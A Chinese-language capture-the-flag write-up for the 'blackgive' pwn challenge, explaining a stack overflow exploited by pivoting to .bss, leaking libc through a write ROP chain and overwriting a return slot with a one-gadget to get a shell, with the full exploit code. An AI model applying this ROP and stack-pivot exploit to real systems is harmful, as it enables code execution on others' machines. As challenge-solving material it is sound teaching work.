# blackgive

## 题目简述

程序存在栈溢出，但首段输入空间不足以同时完成泄露和返回 libc。二进制未开启 PIE，可以用 `leave; ret` 把栈迁移到固定 `.bss`，在新栈上调用 `write` 泄露 GOT，再调用 `read` 把 one-gadget 写到 ROP 链末尾的返回地址。

## 解题过程

利用所需地址为：

```python
leave_ret = 0x4007A3
pop_rdi = 0x400813
pop_rsi_r15 = 0x400811
puts_got = 0x601018
write_plt = 0x4005A0
read_plt = 0x4005C0
bss = 0x6010A0
```

密码缓冲区到保存的 `rbp` 距离为 `0x20`。保留正确密码 `paSsw0rd\0`，把保存的 `rbp` 改为 `bss - 8`，返回地址改为 `leave; ret`：

```python
first = b"paSsw0rd\x00".ljust(0x20, b"\x00")
first += p64(bss - 8)
first += p64(leave_ret)
io.sendafter(b"password:", first)
```

程序把后续内容读到 `.bss`。执行 `leave` 后，`rsp` 切到 `bss - 8`，弹出的占位 `rbp` 位于 `bss - 8`，下一项 `bss` 就成为新栈的首个返回地址。

新栈先执行 `write(1, puts@got, ...)` 泄露 libc 地址，再执行 `read(0, bss + 12*8, ...)`：

```python
chain = flat(
    pop_rdi, 1,
    pop_rsi_r15, puts_got, 0,
    write_plt,
    pop_rdi, 0,
    pop_rsi_r15, bss + 12 * 8, 0,
    read_plt,
)
io.sendafter(b"right!", chain)
```

这里的偏移不是任意选择。上述 ROP 链正好占 12 个八字节项，所以 `bss + 12*8` 是最后一个 `read` 返回时将要取出的下一项。先根据泄露计算 libc 基址和 one-gadget：

```python
leaked_puts = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))
libc.address = leaked_puts - libc.sym["puts"]
one_gadget = libc.address + 0x4F432
```

再发送一个八字节地址：

```python
io.send(p64(one_gadget))
io.interactive()
```

`read` 把该地址写入自己的后继返回槽；返回时直接跳到 one-gadget，取得 shell。官方 PDF 使用固定远端地址差值计算 libc 基址，上述写法把同一关系改成了更清楚的 `leak - libc.sym['puts']`。文档未保存动态 flag。

## 方法总结

栈迁移的重点是同时计算旧栈覆盖布局和新栈的首地址；`leave` 会先令 `rsp=rbp`，随后还要再弹出一个 `rbp`。本题第二阶段还巧妙复用了 ROP 链之后的空槽：让 `read` 的目标恰好等于它的返回地址位置，就不必再安排额外跳板。所有 GOT、gadget 和 libc 偏移都依赖题目附件，复现时应从实际二进制重新确认。
